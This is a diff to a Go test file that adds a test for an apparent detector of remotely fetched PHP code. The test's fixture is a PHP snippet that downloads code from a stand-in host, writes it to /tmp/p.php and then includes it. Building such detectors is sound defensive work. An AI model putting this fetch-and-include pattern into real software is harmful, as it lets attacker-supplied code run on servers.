@@ -367,6 +367,16 @@ func TestDecodeUpgradesOnlyDecodedOrigins(t *testing.T) {
 	}
 }
 
+func TestWrittenEvidenceJoinsBasisWithoutReplacingEndpoint(t *testing.T) {
+	got := onlyResult(t, []byte(`<?php
+file_put_contents('/tmp/p.php', file_get_contents('https://example.invalid/p'));
+file_put_contents('/tmp/p.php', curl_exec($c));
+include '/tmp/p.php';`))
+	if got.Source != "file_get_contents" || got.Confidence != ConfidenceHigh || got.Basis != BasisAlwaysRemote || got.ResolutionOffset != -1 {
+		t.Fatalf("result = %+v, want original endpoint with High always-remote proof", got)
+	}
+}
+
 // Every exported Basis constant must be valid, and so ranked: Valid is
 // membership in rankedBases, so a constant added without a rank would make
 // the worker boundary reject every reply that carries it. The constants are
